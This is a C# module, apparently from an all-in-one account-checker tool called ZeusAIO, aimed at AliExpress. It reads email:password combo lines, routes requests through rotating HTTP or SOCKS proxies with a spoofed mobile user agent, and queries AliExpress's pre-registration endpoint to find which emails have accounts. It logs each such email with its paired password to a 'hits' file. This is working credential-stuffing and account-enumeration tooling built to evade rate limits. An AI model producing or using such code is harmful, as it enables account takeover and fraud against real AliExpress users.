using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;
using System.Runtime.InteropServices.WindowsRuntime;

namespace Aliexpress
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Linux; Android 5.1.1; SM-N950N Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = false;
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string text2 = httpRequest.Get("https://login.aliexpress.com/join/preCheckForRegister.htm?registerFrom=AE_MAIN_POPUP_WHOLESALE&umidToken=TF8667EB6100A86A003D1394117BC098531BE493439628104133F08A610&ua=121%23%2FYnlk%2Fa66JQlVlhdG8AelLTlA0fNT33VOnraqEg2vw7DKxJnEEpSlhyY8psdK5jVllKY%2BzPIDMlSAQOZZLQPll9YAcWZKujVVyeH4FJ5KM9lOlrJEGiIlMLYAcfdK5jVlmuY%2BapIxM9VO3rnEkDIll9YOc8dKkjVlwgZZgz4XluVS0bvsbc9MtFPe6GG62ibYnsshu%2FmCjVDkeILF9K0bZs0JnCVMZujhLzT83%2Fybbi0CNk1INn0lPi0n6XSp2D0kZ748u%2FmCbibCeIaFtWbbZrDnnx9pCibCZ0T83BhC6ibBZRXB9hWMZecnzgmunYsUueNIG%2Fm7%2FibvehuddcVC6ibn5u9lfAHASYrvd0P1hdYMiBzHDlG1xhSAXe2Dp5YLO7aWyVA%2BDZKhnH1NiATHbEtUNISsaxdYZ9JlCSwwX5pMXwc8lSgokSUKkFgeP1eO1B8mXC2MYwSfvzuZ%2FvPVHwANcTEnu3J9F2wjA2%2FSdncze%2B72x4i56LOdJqyOCgEhs4TtfNNLb0zTryXyyaDcmdDeaRtp6fmiuYnh8kAdtewMVr9ngS9QM0udY13dLJgrnu6FkyC2i2lYQ9hGC5xcJ72YIp8OUNcwzQulMbnIDxmTB8XLh8LedQCmyaxpiVCVzWAVAWziRGif4CKGP4wE5AowYwdYMnOUF0Sg2QTOBvyuGCCJxkdozXdCPpIJQfQOwq13VkWq8OxJ9X9OqtPv4iq3S%2FpUTxs6p9z7qpN0fEUVBpfZwZqgdX0vdo8z0gW1bgXtszPBMdT7YaQoTtLAVqoQ899JeNmu7LN6yPaClZUkeojQ7DFzKlWratog0OIPp31Erenh%2BofLciibLpzqPzHnb8ulHCZhYBDDobTeeM2aHejvSs7SEWQTIzcwH0dwN5pFU1Uvg1NtW6d8mXeAWroHIiNvKeqRWc76A%2BbSu7nL0CFIZKezWp5hFZa6cT13T6WJ%2FkgHzGtSYO%2B80Z4D6omU%2FAByCPOlsotsO269hynZscAXTgD4wt9fz2Ge%2BAMy3lGRP9GnONcP0Zac5J%2BDA9JD0gkOo%2FYCBngFPJhRDKEzcXngKhvb7HQWZU3mDAJ3U7DP7TQujUgBclZ6%2B3d%2BVQO3DUs1CPOpfljgMRHYgOjp2fdca63StbJ1ciUc4UvLzc0jrKYFl2wjv4amBWosw%3D%3D&email=" + s[0]).ToString();
                            bool flag7 = text2.Contains(",\"isEmailExisted\":true");

                            if (flag7)
                            {
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - ALIEXPRESS] " + s[0] + ":" + s[1], Color.Green);
                                }
                                Export.AsResult("/Aliexpress_hits", s[0] + ":" + s[1]);
                                return false;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                        }
                        break;
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}


      